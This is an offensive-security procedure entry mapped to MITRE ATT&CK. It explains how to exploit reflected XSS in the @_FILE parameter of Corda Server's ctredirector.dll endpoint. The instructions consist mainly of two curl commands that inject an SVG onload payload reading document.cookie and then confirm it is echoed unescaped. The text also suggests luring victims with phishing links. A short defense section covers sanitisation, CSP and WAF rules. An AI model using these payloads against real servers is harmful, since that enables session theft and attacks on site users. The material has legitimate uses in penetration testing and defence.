---
tags:
  - xss
  - injection
  - error-echoing
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-xss-file]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:16:24.986Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 2d3ce291-ab51-4020-8804-824d5f7ee297
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---

# Inject-XSS-Payload-in-_FILE-Parameter

## Summary

This procedure triggers a server error on the Corda Server's ctredirector.dll endpoint by supplying an invalid URL in the @_FILE parameter, causing the input to be echoed back unsanitized in the error response, setting up for XSS exploitation.

## Description

The ctredirector.dll endpoint processes file or URL specifications via the @_FILE parameter. Providing an invalid or non-existent URL, such as one with an embedded XSS payload, results in an error message that reflects the input without HTML escaping. This step alone does not execute the payload but prepares the reflected content for interpretation as HTML in the subsequent step. The attack targets public-facing web applications running Corda Server, allowing remote attackers to craft URLs that victims can be tricked into visiting, such as via phishing links.

## Requirements

1. Network access to the target Corda Server's web interface
2. A web browser like Firefox or curl for sending HTTP requests
3. Knowledge of the endpoint URL: /scripts/ctredirector.dll

## Defense

Defensive measures and detection strategies:

- Input validation and sanitization on @_FILE parameter to prevent echoing of raw user input
- Content Security Policy (CSP) headers to block inline script execution
- Web Application Firewall (WAF) rules to detect and block suspicious parameter values containing script tags
- Logging and monitoring of error responses for anomalous payloads

## Objectives

1. Elicit an unsanitized error response echoing the injected payload
2. Confirm vulnerability to reflected input without escaping
3. Prepare for content type manipulation to enable execution

## Instructions

### Step 1: Craft and Send Malicious Request

**Context**: Access the vulnerable endpoint and inject an XSS payload disguised as part of an invalid URL in @_FILE to trigger the error echo.

**Command** ([[commands/curl-inject-xss-file]]):
```bash
curl "http://target.com/scripts/ctredirector.dll?_FILE=http://google.com/<svg/onload=confirm(document.cookie)>" -v
```

> This command sends a GET request to the endpoint with an invalid @_FILE value containing an SVG-based XSS payload. The -v flag provides verbose output to inspect the response headers and body. Expected output includes a 200 or error status with the payload echoed in the response body, such as "Error loading file: http://google.com/<svg/onload=confirm(document.cookie)>".

### Step 2: Verify Echoed Input

**Context**: Inspect the response to ensure the payload is reflected without escaping, confirming the vulnerability.

**Command** ([[commands/curl-inject-xss-file]]):
```bash
curl "http://target.com/scripts/ctredirector.dll?_FILE=http://google.com/<svg/onload=confirm(document.cookie)>" | grep "svg/onload"
```

> This pipes the response through grep to check for the unescaped payload. Successful output shows the exact injected string in the error message.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss-file]]

## Tools Used

- [[tools/Firefox]]

## Tags

- xss
- injection
- corda-server

